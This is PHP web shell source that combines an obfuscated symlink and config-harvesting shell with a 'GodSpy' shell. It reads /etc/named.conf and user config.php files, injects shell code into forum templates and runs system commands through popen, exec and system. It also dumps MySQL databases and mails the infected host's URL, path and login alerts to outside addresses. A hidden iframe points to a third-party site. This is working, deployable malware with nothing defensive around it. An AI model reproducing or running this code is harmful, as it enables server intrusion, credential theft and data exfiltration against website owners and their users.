$IIIIIIIllI1l = "UPDATE template SET template ='".$IIIIIIIllI1I."' WHERE title ='FAQ'";
$IIIIIIIlI1ll  = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJMWwx')]($IIIIIIIllI1l,$IIIIIIIlI1I1);
if ($IIIIIIIlI1ll){$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TdWNjZWVkPC9iPiBzaGVsbCBpbiBzZWFyY2gucGhw');}
else
{
$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPg==');
}
$IIIIIIIlIllI = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIlIlI1).$GLOBALS['OOO0000O0']('');
echo "<tr>
<td><a target='_blank' href='http://$IIIIIIIlIllI'>$IIIIIIIlIlI1</a></td>
<td><a target='_blank' href='$IIIIIIII1I11'>config</a></td><td>".$r.$GLOBALS['OOO0000O0']('PC90ZD48L3RyPg==');
}else{
echo "<tr>
<td><a target='_blank' href='http://$IIIIIIIlIllI'>$IIIIIIIlIlI1</a></td>
<td><a target='_blank' href='http://$IIIIIIII1I11'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
}
}
die();
}
if(!$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbGxs')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'))){
$IIIIIIIIIll1 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('L2V0Yy9uYW1lZC5jb25m'));
}else{
$IIIIIIIIIll1 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'));
}
if(!$IIIIIIIIIll1)
{
die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else
{
echo "<div class='tmp'>
<form method='POST' action='$IIIIIIIIIlI1?sws=vb'>
<input type='submit' value='Inject shell' />
<input type='hidden' value='1' name='s' />
</form>
<br /><br />
<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
$IIIIIIIIII1l = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')]($GLOBALS['OOO0000O0']('dmIudHh0'),$GLOBALS['OOO0000O0']('dw=='));
foreach($IIIIIIIIIll1 as $IIIIIIIIIl1l){
if($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUlJ')]($GLOBALS['OOO0000O0']('em9uZQ=='),$IIIIIIIIIl1l)){
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUls')]($GLOBALS['OOO0000O0']('I3pvbmUgIiguKikiIw=='),$IIIIIIIIIl1l,$IIIIIIIII1I1);
if(strlen($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIII1I1[1][0])) >2){
$IIIIIIIII1ll = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWwx')](@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMTFJ')]($GLOBALS['OOO0000O0']('L2V0Yy92YWxpYXNlcy8=').$IIIIIIIII1I1[1][0]));
$IIIIIIIII11l=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L2luY2x1ZGVzL2NvbmZpZy5waHA=');
$IIIIIIIII111=get_headers($IIIIIIIII11l);
$wp=$IIIIIIIII111[0];
$IIIIIIIIlIIl=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3ZiL2luY2x1ZGVzL2NvbmZpZy5waHA=');
$IIIIIIIIlII1=get_headers($IIIIIIIIlIIl);
$IIIIIIIIlIlI=$IIIIIIIIlII1[0];
$IIIIIIIlI111=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHA=');
$IIIIIIIllIII=get_headers($IIIIIIIlI111);
$IIIIIIIllIIl=$IIIIIIIllIII[0];
$IIIIIIII1I1I = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($wp,$GLOBALS['OOO0000O0']('MjAw'));
$IIIIIIII1I11=$GLOBALS['OOO0000O0']('Jm5ic3A7');
if ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($wp,$GLOBALS['OOO0000O0']('MjAw')) == true )
{
$IIIIIIII1I11= $IIIIIIIII11l;
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIlIlI,$GLOBALS['OOO0000O0']('MjAw')) == true)
{
$IIIIIIII1I11= $IIIIIIIIlIIl;
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIllIIl,$GLOBALS['OOO0000O0']('MjAw')) == true)
{
$IIIIIIII1I11= $IIIIIIIlI111;
}
else
{
continue;
}
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$IIIIIIIIIl1l = $IIIIIIIII1I1[1][0];
$w = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbElJ')]($IIIIIIIIII1l,"$IIIIIIII1I11||$IIIIIIIIIl1l \n");
if($w){$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TYXZlPC9iPg==');}else{$r = $GLOBALS['OOO0000O0']('PGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPg==');}
echo $GLOBALS['OOO0000O0']('PHRyPjx0ZD48YSBocmVmPWh0dHA6Ly93d3cu').$IIIIIIIII1I1[1][0].$GLOBALS['OOO0000O0']('Pg==').$IIIIIIIII1I1[1][0]."</a></td>
<td><a href='$IIIIIIII1I11'>config</a></td><td>".$r.$GLOBALS['OOO0000O0']('PC90ZD48L3RyPg==');
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}
}
}
}
break;
case $GLOBALS['OOO0000O0']('aGVscA=='):
echo "<div class='tmp'>
<table align='center' width='40%'><td>function</td><td>Case</td>";
$safe_mode = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxsbElJ')]($GLOBALS['OOO0000O0']('c2FmZV9tb2Rl'));
if($safe_mode){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
echo "<tr><td>Safe Mode</td><td>$r</td>";
$IIIIIIIlllIl = function_exists($GLOBALS['OOO0000O0']('c3ltbGluaw=='));
if(!$IIIIIIIlllIl){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
echo "<tr><td>function symlink</td><td>$r</td>";
$IIIIIIIlllIl = function_exists($GLOBALS['OOO0000O0']('ZmlsZQ=='));
if(!$IIIIIIIlllIl){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
echo "<tr><td>function file</td><td>$r</td>";
$IIIIIIIlllIl = function_exists($GLOBALS['OOO0000O0']('ZmlsZV9nZXRfY29udGVudHM='));
if(!$IIIIIIIlllIl){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
echo "<tr><td>function file_get_contents</td><td>$r</td>";
$IIIIIIIlllIl = function_exists($GLOBALS['OOO0000O0']('bWtkaXI='));
if(!$IIIIIIIlllIl){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
echo "<tr><td>function mkdir</td><td>$r</td>";
$IIIIIIIlllIl = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxsbEkx')]($GLOBALS['OOO0000O0']('c3ltL3Jvb3Q='));
if(!$IIIIIIIlllIl){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
echo "<tr><td>Permission denied</td><td>$r</td>";
$IIIIIIIlllIl = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxbGxJ')]($GLOBALS['OOO0000O0']('L0ZvcmJpZGRlbi8='),@file_get_contents($GLOBALS['OOO0000O0']('c3ltL3Jvb3Q=')) or !@file_get_contents($GLOBALS['OOO0000O0']('c3ltL3Jvb3Q=')));
if($IIIIIIIlllIl){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #006600'>True</b>";}
echo "<tr><td>Forbidden</td><td>$r</td>";
echo $GLOBALS['OOO0000O0']('PC90YWJsZT48L2Rpdj4=');
break;
default:
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxsbGxJ')]("Location: $IIIIIIIIIlI1");
}
?>
<form action='' method='post'>
<span>__LOGOUT__</span><br><input type='submit' name='delete' value='logout'>
</form>
</td>
<?php
}
else
{
echo $GLOBALS['OOO0000O0']('PGJyIC8+PGJyIC8+PGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0idXBsb2FkZXIiIGlkPSJ1cGxvYWRlciI+');
echo $GLOBALS['OOO0000O0']('PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIHZhbHVlPSJDaG9vc2UgZmlsZSIgc2l6ZT0iNjAiID48aW5wdXQgbmFtZT0iX3VwbCIgdHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPg==');
if( $_POST[$GLOBALS['OOO0000O0']('X3VwbA==')] == $GLOBALS['OOO0000O0']('VXBsb2Fk') ) {
if(@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxsbGxs')]($_FILES[$GLOBALS['OOO0000O0']('ZmlsZQ==')][$GLOBALS['OOO0000O0']('dG1wX25hbWU=')],$_FILES[$GLOBALS['OOO0000O0']('ZmlsZQ==')][$GLOBALS['OOO0000O0']('bmFtZQ==')])) {echo $GLOBALS['OOO0000O0']('PGJyIC8+PGJyIC8+PGI+VXBsb2FkZWQgc3VjY2Vzc2Z1bCAhITxicj48YnI+');}
else {echo $GLOBALS['OOO0000O0']('PGJyIC8+PGJyIC8+Tm90IHVwbG9hZGVkICEhPGJyPjxicj4=');}
}
echo $GLOBALS['OOO0000O0']('DQo8YnIgLz48YnIgLz48YnIgLz48L2I+PC9iPjxkaXYgY2xhc3M9ImZvdCI+Q29kM2QgYnkgPGI+UzNuNHQwMHI8L2I+IElkZWEgYnkgPGI+TXIuQWxzYTNlazwvYj4NCjxiciAvPjxiciAvPg0KPGIgc3R5bGU9ImNvbG9yOiByZWQiOz4gICBTZWMtdy5Db20gIDwvYj4NCjxiciAvPjxiciAvPg0KTXVzbGltcyBIYWNrZXJzPC9kaXY+IA==');
}
function IIIIIIIllll1($IIIIIIIlll1I,$IIIIIIIlll1l,$IIIIIIIlll11){
$IIIIIIIll1II = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]($IIIIIIIlll1l,$IIIIIIIlll1I);
$IIIIIIIll1II = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]($IIIIIIIlll11,$IIIIIIIll1II[1]);
return $IIIIIIIll1II[0];
}
echo $GLOBALS['OOO0000O0']('PC9kaXY+DQoNCjxhIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmU7IGNvbG9yOiAjRjRGNEY0OyIgdGl0bGU9Ij8/Pz8/Pz8iL2hyZWY9Imh0dHA6Ly9zZWMtdy5jb20vY2MiPj8/Pz8/Pz88L2E+DQoNCjxhIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmU7IGNvbG9yOiAjRjRGNEY0OyIgdGl0bGU9Ij8/Pz8gPz8/Pz8/PyIvaHJlZj0iaHR0cDovL3NlYy13LmNvbS9jYyI+Pz8/PyA/Pz8/Pz8/PC9hPg0KDQoNCg0KPC9ib2R5Pg0KDQo8L2h0bWw+DQo=');
;echo $GLOBALS['OOO0000O0']('');
$IIIIIIII1lII = $GLOBALS['OOO0000O0']('d3d3LlNoM2xsLlVz');
if(!$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSWxJbGwx')]($IIIIIIII1lII,$_SERVER[$GLOBALS['OOO0000O0']('U0VSVkVSX05BTUU=')]))
{
$IIIIIIIll1Il = $GLOBALS['OOO0000O0']('cXdlcnR5LndlcnR5ODJAeWFob28uY29t');
$IIIIIIIll1I1 = $GLOBALS['OOO0000O0']('RUdGTQ==');
$IIIIIIIll1lI = $GLOBALS['OOO0000O0']('ZnJvbTogRUdGTSA8cXdlcnR5LndlcnR5ODJAeWFob28uY29tPg==');
$IIIIIIIll1ll = $GLOBALS['OOO0000O0']('TGluayA6IGh0dHA6Ly8=') .$_SERVER[$GLOBALS['OOO0000O0']('U0VSVkVSX05BTUU=')] .$_SERVER[$GLOBALS['OOO0000O0']('UkVRVUVTVF9VUkk=')] ."\r\n";
$IIIIIIIll1ll .= $GLOBALS['OOO0000O0']('UGF0aCA6IA==') .__file__;
$IIIIIIIll1l1 = @mail($IIIIIIIll1Il,$IIIIIIIll1I1,$IIIIIIIll1ll,$IIIIIIIll1lI);
echo $GLOBALS['OOO0000O0']('');
exit;
}
;echo $GLOBALS['OOO0000O0']('PC9ib2R5PjwvaHRtbD4=');chdir($IIIIIIIll11I);c99shexit();;echo $GLOBALS['OOO0000O0']('DQoNCg0K');?><iframe width=0px height=0px frameborder=no name=frame1 src=http://fightagent.ru> </iframe>
?>
<?php
} elseif (isset($_SESSION['shellgs'])) {
$date = date('m/d/Y h:i:s a', time());
$urlforme1 = $_SERVER['REQUEST_URI'];
$ip = $_SERVER['REMOTE_ADDR'];
$name = $_SERVER["SERVER_NAME"];
$nameurl = $name.$urlforme1;
$host = gethostbyaddr($ip);
$to = "fanta@hackforums.net";
$subject = "Login Attempted to V2 GS, Access Granted";
$message = "Access to your shell V2 GS has been attempted and succeeded from $ip and located at $host on $date";
$from = "shell@$nameurl";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('memory_limit','128M');
@ini_set('upload_max_filesize','40M');
function loginpage() { ?>

<html><head>
<meta name="robots" content="noindex,nofollow,noarchive">
<style type="text/css">
*{font:11px Verdana;}input {background:#FFF;line-height:18px;border:1px solid #666;}
</style>
</head>
<body>
<form method="post" action="<?php echo $self;?>">
Password: <input name="password" type="password" size="20" value="">
<input type="hidden" name="doing" value="login">
<input type="submit" value="Login">
</form>
<form action='' method='post'>
<span>__LOGOUT__</span><br><input type='submit' name='delete' value='logout'>
</form>
</body></html>
<?php exit;
}
function getcfg($var) {
	$l = @ini_get($var);$i = @get_cfg_var($var);
	$l = $l == 0 ? 'No' : ($l == 1 ? 'Yes' : $l);
	$i = $i == 0 ? 'No' : ($i == 1 ? 'Yes' : $i);
	$r = 'Local value: '.$l.' - INI value: '.$i;
	return $r;
}
function formhead($arg = array()) {
!$arg['method'] && $arg['method'] = 'post';
!$arg['action'] && $arg['action'] = $self;
$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
!$arg['name'] && $arg['name'] = 'form1';
p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
if($arg['title']) {p('<h2>'.$arg['title'].' &raquo;</h2>');}
}
function getPath($scriptpath, $nowpath) {
	if($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if(substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}
function makehide($name,$value=''){p('<input id="'.$name.'" type="hidden" name="'.$name.'" value="'.$value.'" />');}
function nofunc(){$r=explode(',',@ini_get("disable_functions"));return empty($r)?array():$r;}
function ue($str){return urlencode($str);}
function sizecount($size) {
	if($size > 1073741824) {
		$size = round($size / 1073741824 * 100) / 100 . ' G';
	} elseif($size > 1048576) {
		$size = round($size / 1048576 * 100) / 100 . ' M';
	} elseif($size > 1024) {
		$size = round($size / 1024 * 100) / 100 . ' K';
	} else {
		$size = $size . ' B';
	}
	return $size;
}
function getChmod($filepath){
	return substr(base_convert(@fileperms($filepath),10,8),-4);
}
function getPerms($filepath) {
	$mode = @fileperms($filepath);
	if(($mode & 0xC000) === 0xC000) {$type = 's';}
	elseif(($mode & 0x4000) === 0x4000) {$type = 'd';}
	elseif(($mode & 0xA000) === 0xA000) {$type = 'l';}
	elseif(($mode & 0x8000) === 0x8000) {$type = '-';} 
	elseif(($mode & 0x6000) === 0x6000) {$type = 'b';}
	elseif(($mode & 0x2000) === 0x2000) {$type = 'c';}
	elseif(($mode & 0x1000) === 0x1000) {$type = 'p';}
	else {$type = '?';}
	$owner['read'] = ($mode & 00400) ? 'r' : '-'; 
	$owner['write'] = ($mode & 00200) ? 'w' : '-'; 
	$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
	$group['read'] = ($mode & 00040) ? 'r' : '-'; 
	$group['write'] = ($mode & 00020) ? 'w' : '-'; 
	$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
	$world['read'] = ($mode & 00004) ? 'r' : '-'; 
	$world['write'] = ($mode & 00002) ? 'w' : '-'; 
	$world['execute'] = ($mode & 00001) ? 'x' : '-'; 
	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
	return 
$type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].
$world['write'].$world['execute'];
}
function getUser($filepath)	{
	$r='';
	if(isfunc('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($filepath));
		if($array && is_array($array)) {
			$r.= ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
		}
	}
	return $r;
}
function deltree($deldir) {
	$mydir=@dir($deldir);	
	while($file=$mydir->read())	{ 		
		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { 
			@chmod($deldir.'/'.$file,0777);
			deltree($deldir.'/'.$file); 
		}
		if(is_file($deldir.'/'.$file)) {
			@chmod($deldir.'/'.$file,0777);
			@unlink($deldir.'/'.$file);
		}
	} 
	$mydir->close(); 
	@chmod($deldir,0777);
	return @rmdir($deldir) ? 1 : 0;
}
function getUpPath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}
function debuginfo() {global $starttime;$mtime = explode(' ', microtime());$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);echo 'Processed in '.$totaltime.' second(s)';}
function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
		p('<h2>Can not connect to MySQL server</h2>');
		exit;
	}
	if($link && $dbname) {
		if(!@mysql_select_db($dbname, $link)) {
			p('<h2>Database selected has error</h2>');
			exit;
		}
	}
	if($link && mysql_get_server_info() > '4.1') {
		if(in_array(strtolower($charset), array('latin1', 'utf8'))) {
			q("SET character_set_connection=$charset, character_set_results=$charset, 
character_set_client=binary;", $link);
		}
	}
	return $link;
}
function bg() {global $bgc;return ($bgc++%2==0) ? 'alt1' : 'alt2';}
function mycmd($c) {
$re='';
	if($c) {
	$pi=array(array('pipe','r'),array('pipe','w'),array('pipe','w'));
	if(isfunc('popen') && @is_resource($f=popen($c.' 2>&1','r'))) {$re.=gres($f);@pclose($f);}
	elseif(isfunc('proc_open') && @is_resource($f=proc_open($c,$pi,$pipes))) {$re.=gres($pipes[1]);$re.=gres($pipes[2]);foreach($pipes as $pp)fclose($pp);@proc_close($f);}
	elseif(isfunc('exec')){exec($c,$re);$re=join("\n",$re);}
	elseif(isfunc('shell_exec')){$re=shell_exec($c);}
	elseif(isfunc('system')) {ob_start();system($c);$re=@ob_get_contents();@ob_end_clean();}
	elseif(isfunc('passthru')){ob_start();passthru($c);$re=@ob_get_contents();@ob_end_clean();}
	}
return $re;
}
function isfunc($f){return (function_exists($f) && is_callable($f) && !in_array($f,nofunc()))?1:0;}
function gres($r){if(!isfunc('stream_get_contents')){while(!feof($r)){$re.=fread($r,4096);}}else{$re.=stream_get_contents($r);}return $re;}
function sv_file($f,$c) {
	if(function_exists('file_put_contents')) {return @file_put_contents($f,$c);}
	else{
	$r=false;
	if($fp=@fopen($f,'w')){
		@fwrite($fp,$c);
		@fclose($fp);
		$r=true;
	}
	return $r;
	}
}
function maketext($arg = array()){
!$arg['cols'] && $arg['cols'] = 100;
!$arg['rows'] && $arg['rows'] = 25;
$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}
function formfooter($name=''){!$name && $name = 'submit';p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit" /></p>'."\n</form>");}
function makeselect($arg = array()){
if($arg['onchange']) {
	$onchange = 'onchange="'.$arg['onchange'].'"';
}
$arg['title'] = $arg['title'] ? $arg['title'] : '';
if($arg['newline']) p('<p>');
	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
	if(is_array($arg['option'])) {
		foreach ($arg['option'] as $key=>$value) {
			if($arg['selected']==$key) {
				p("<option value=\"$key\" selected>$value</option>");
			} else {
				p("<option value=\"$key\">$value</option>");
			}
		}
	}
p("</select>");
if($arg['newline']) p('</p>');
}
function which($pr){$path = mycmd("which $pr");return ($path ? $path : $pr);}
function s_array(&$array) {
	if(is_array($array)) {
		foreach ($array as $k => $v) {
			$array[$k] = s_array($v);
		}
	} else if(is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}
function makeinput($arg = array()){
$arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
!$arg['type'] && $arg['type'] = 'text';
$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
if($arg['newline']) {
	p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
	} else {
	p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
	}
}
function m($m,$c='m') {echo "<div class=\"$c\">$m</div>\n";}
function scookie($key, $value, $life = 0, $prefix = 1) {
	global $admin, $timestamp, $_SERVER;
	$key = ($prefix ? $admin['cookiepre'] : '').$key;
	$life = $life ? $life : $admin['cookielife'];
	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
	setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
}
function p($str){echo $str."\n";}
function tbhead() {p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');}
function tbfoot(){p('</table>');}
define('F_ROOT',str_replace('\\','/',(($cwd = getcwd()) ? $cwd : ($_SERVER['SCRIPT_FILENAME'] ? dirname($_SERVER['SCRIPT_FILENAME']) : '.'))).'/');
define('S_ROOT',str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']));
define('IS_WIN',DIRECTORY_SEPARATOR=='\\');
define('IS_COM',class_exists('COM') ? 1 : 0 );
define('IS_GPC',get_magic_quotes_gpc());
define('IS_PHPINFO', isfunc('phpinfo'));
ob_start();
$timestamp=time();
$mtime = explode(' ',microtime());
$starttime = $mtime[1] + $mtime[0];
$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
if(!empty($_SERVER['QUERY_STRING'])){$self.='?'.$_SERVER['QUERY_STRING'];}
foreach(array('_GET','_POST') as $_request) {
	foreach($$_request as $_key => $_value) {
	if($_key{0} != '_') {
		if(IS_GPC) {$_value=s_array($_value);}
		$$_key = $_value;
	}
	}
}
$admin=array('check' => 1, 'pass' => 'fa9ad25743ed5429719e16b906c7706413503f60841852a6d9220a8f65f63b22','cookiepre' => '','cookiedomain' => '','cookiepath' => '/','cookielife' => 86400);
// Decrypted:	MD5 : cojelon

if($charset == 'utf8') {
header("content-Type: text/html; charset=utf-8");
} elseif($charset == 'latin1') {
header("content-Type: text/html; charset=iso-8859-1");
}
if($haz == "log") {
	scookie('godssid', '', -86400 * 365);
	p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
	p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
	exit;
}
if($admin['check']) {
$password = hash("sha256",$password);
	if($doing == 'login') {
		if($admin['pass'] == $password) {
			scookie('godssid', $password);
			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
			p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
$date = date('m/d/Y h:i:s a', time());
$urlforme1 = $_SERVER['REQUEST_URI'];
$ip = $_SERVER['REMOTE_ADDR'];
$name = $_SERVER["SERVER_NAME"];
$nameurl = $name.$urlforme1;
$host = gethostbyaddr($ip);
$to = "fanta@hackforums.net";
$subject = "Login Attempted to V2 GS Part 2, Access Granted";
$message = "Access to your shell V2 part 2 GS has been attempted and succeeded from $ip and located at $host on $date";
$from = "shell@$nameurl";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
			exit;
		}
	}
	if($_COOKIE['godssid']) {
		if($_COOKIE['godssid'] != $admin['pass']) loginpage();
	} else loginpage();
}
$errmsg='';
if($haz=='phpinfo') {
	if(IS_PHPINFO) {phpinfo();die('<h1 style="text-align:center"><a href="'.$self.'">Back to GodSpy</a></h1>');}else{$errmsg='phpinfo() function disabled';}
}
if($doing == 'downfile' && $thefile) {
	if(!@file_exists($thefile)) {
		$errmsg = 'The file you want to Download not exist';
	} else {
		$fileinfo = pathinfo($thefile);
		header('Content-type: application/x-'.$fileinfo['extension']);
		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
		header('Content-Length: '.filesize($thefile));
		@readfile($thefile);
		exit;
	}
}
if($doing=='backupmysql' && !$saveasfile) {
	$lnk=dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
	$table = array_flip($table);
	$result = q("SHOW tables");
	if(!$result) p('<h2>'.mysql_error().'</h2>');
	$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if(isset($table[$currow[0]])) {
			$mysqldata .= sqldumptable($currow[0]);
		}
	}
	mysql_close($lnk);
	exit;
}
if($doing=='mysqldown'){
	if(!$dbname) {
		$errmsg = 'Please input dbname';
	} else {
		dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		if(!file_exists($mysqldlfile)) {
			$errmsg = 'The file you want Downloadable was nonexistent';
		} else {
			$result = q("select load_file('$mysqldlfile');");
			if(!$result){
				q("DROP TABLE IF EXISTS tmp_god;");
				q("CREATE TABLE tmp_god (content LONGBLOB NOT NULL);");
				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_god FIELDS TERMINATED BY '__god_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__god_{$timestamp}_eof__';");
				$result = q("select content from tmp_god");
				q("DROP TABLE tmp_god");
			}
			$row = @mysql_fetch_array($result);
			if(!$row) {
				$errmsg = 'Load file failed '.mysql_error();
			} else {
				$fileinfo = pathinfo($mysqldlfile);
				header('Content-type: application/x-'.$fileinfo['extension']);
				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
				header("Accept-Length: ".strlen($row[0]));
				echo $row[0];
				exit;
			}
		}
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="robots" content="noindex, nofollow, noarchive" />
<title><?php echo $_SERVER['HTTP_HOST'];?> | GODSpy</title>
<style type="text/css">
body{margin:0;table-layout:fixed;word-break:break-all;}
body,td,.input,.bt{font:12px Arial,Tahoma;}
body,td{line-height:16px;}
.input{line-height:22px;}
.input,.area{background:#fff;border:1px solid #666;padding:2px;}
.area{font:12px Consolas, 'Courier New', Monospace;}
